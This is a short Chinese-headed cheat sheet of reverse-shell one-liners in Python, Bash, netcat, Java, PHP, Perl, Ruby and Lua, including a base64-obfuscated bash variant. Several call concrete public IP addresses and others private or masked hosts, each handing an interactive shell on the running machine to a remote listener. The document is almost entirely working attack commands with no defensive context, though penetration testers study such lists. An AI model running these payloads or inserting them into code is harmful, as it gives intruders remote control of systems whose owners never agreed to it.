反弹shell

```php
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("101.43.225.132",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
```php
bash -i >& /dev/tcp/182.92.161.222/7777 0>&1
```
```php
nc 192.168.31.151 7777 -e  /bin/sh
```
```
nc -c /bin/sh 192.168.10.54 4444
```

```bash
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC81Ni40Ny4zMy42NS8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}
```





```java

Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/117.72.12.120/9998 0>&1"});
```

**php**

```bash
php -r '$sock=fsockopen("192.168.12.55",2333);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**perl**

```perl
perl -e 'use Socket;$i="120.xxx.xxx.xxx";$p=8989;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**ruby**

```ruby
ruby -rsocket -e'f=TCPSocket.open("120.xxx.xxx.xxx",8989).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

**lua**

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('120.xxx.xxx.xxx','8989');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

